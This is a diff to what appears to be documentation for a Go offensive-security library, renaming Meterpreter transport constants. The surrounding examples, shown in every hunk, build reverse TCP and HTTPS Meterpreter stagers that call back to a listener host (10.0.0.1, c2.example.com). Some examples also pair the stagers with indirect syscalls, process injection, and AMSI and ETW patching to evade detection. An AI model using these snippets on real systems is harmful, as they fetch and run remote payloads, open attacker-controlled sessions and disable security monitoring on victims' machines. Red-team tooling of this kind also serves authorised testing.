@@ -85,7 +85,7 @@ import (
 )
 
 stager := meterpreter.NewStager(&meterpreter.Config{
-    Transport: meterpreter.TransportTCP,
+    Transport: meterpreter.TCP,
     Host:      "10.0.0.1",
     Port:      "4444",
     Timeout:   30 * time.Second,
@@ -101,7 +101,7 @@ if err := stager.Stage(ctx); err != nil {
 
 ```go
 stager := meterpreter.NewStager(&meterpreter.Config{
-    Transport:   meterpreter.TransportHTTPS,
+    Transport:   meterpreter.HTTPS,
     Host:        "10.0.0.1",
     Port:        "443",
     Timeout:     30 * time.Second,
@@ -126,7 +126,7 @@ caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
 defer caller.Close()
 
 stager := meterpreter.NewStager(&meterpreter.Config{
-    Transport: meterpreter.TransportTCP,
+    Transport: meterpreter.TCP,
     Host:      "10.0.0.1",
     Port:      "4444",
     Timeout:   30 * time.Second,
@@ -160,7 +160,7 @@ inj, _ := inject.Build().
     Create()
 
 stager := meterpreter.NewStager(&meterpreter.Config{
-    Transport: meterpreter.TransportTCP,
+    Transport: meterpreter.TCP,
     Host:      "10.0.0.1",
     Port:      "4444",
     Timeout:   30 * time.Second,
@@ -182,7 +182,7 @@ inj, _ := inject.Build().
     Create()
 
 stager := meterpreter.NewStager(&meterpreter.Config{
-    Transport: meterpreter.TransportHTTPS,
+    Transport: meterpreter.HTTPS,
     Host:      "10.0.0.1",
     Port:      "443",
     Timeout:   30 * time.Second,
@@ -199,7 +199,7 @@ stager.Stage(context.Background())
 
 ```go
 // Returns the correct payload name for the current platform
-name := meterpreter.PayloadName(meterpreter.TransportTCP)
+name := meterpreter.PayloadName(meterpreter.TCP)
 // "windows/x64/meterpreter/reverse_tcp" on Windows amd64
 // "linux/x64/meterpreter/reverse_tcp" on Linux amd64
 ```
@@ -232,7 +232,7 @@ func main() {
     evasion.ApplyAll([]evasion.Technique{amsi.ScanBufferPatch(), etw.All()}, caller)
 
     stager := meterpreter.NewStager(&meterpreter.Config{
-        Transport:    meterpreter.TransportHTTPS,
+        Transport:    meterpreter.HTTPS,
         Host:         "c2.example.com",
         Port:         "443",
         Timeout:      30 * time.Second,
